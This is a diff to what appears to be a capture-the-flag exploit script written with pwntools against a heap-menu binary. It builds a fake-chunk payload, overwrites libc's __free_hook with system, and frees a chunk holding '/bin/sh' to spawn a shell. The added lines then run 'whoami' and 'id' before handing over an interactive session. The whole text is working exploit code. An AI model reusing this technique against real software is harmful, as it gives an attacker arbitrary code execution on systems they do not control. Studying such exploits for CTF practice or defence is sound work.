@@ -45,7 +45,6 @@ def edit(index, data):
 def free(index):
     io.send(b'3')
     io.sendafter(b'index: ', str(index).encode())
-    io.recvuntil(b'> ')
 
 def target():
     io.send(b'4')
@@ -79,11 +78,13 @@ payload = chunk_prev + chunk_size + fd + bk + nop + fake_prev_size + fake_size
 
 edit(0, payload)
 free(chunk_b)
+io.recvuntil(b'> ')
 
 overlapped_mparray = p64(0)*3 + p64(libc.sym['__free_hook'] - 8)
 edit(0, overlapped_mparray)
 edit(0, b'/bin/sh\x00' + p64(libc.sym['system']))
 target()
-
-
+free(0)
+io.sendline(b'whoami')
+io.sendline(b'id')
 io.interactive()
